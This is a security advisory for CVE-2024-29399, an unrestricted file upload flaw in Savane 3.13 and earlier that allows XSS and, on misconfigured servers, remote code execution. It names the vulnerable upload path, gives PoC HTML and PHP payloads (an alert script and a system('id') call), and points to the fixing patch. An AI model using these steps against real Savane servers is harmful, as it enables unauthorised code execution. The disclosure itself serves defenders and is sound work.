# CVE-2024-29399 Vulnerability Details

## Overview

In Savane v3.13 and prior, a lack of validation on uploaded files can allow for privilege escalation. Web servers configured according to the installation instructions are vulnerable to Cross-Site Scripting (XSS). In misconfigured web servers this can lead to Remote Code Execution (RCE).

**CWE Classification:** CWE-434: Unrestricted Upload of File with Dangerous Type

**Reported By:** Ally Petitt 

**Affected Product**: Savane

**Affected Versions**: 3.13 and prior

## Validation Steps
1. Visit /register/upload.php in the browser.
2. Upload a malicious file. This can be, but is not limited to, an HTML or PHP file depending on the webserver configuration (see Overview). Examples of either are shown below:

**PoC.html**
```
<script>
  alert("XSS");
</script>
```

**PoC.php**
```
<?php
  echo system("id");
?>
```


4. Visit the displayed link to the uploaded file to trigger code execution.


## Mitigation

Upgrade to Savane version 3.14 or higher. The patch can be found [here](https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&id=8a91ee8aae2599931d8b1c9a97ae4922b0c95c85).
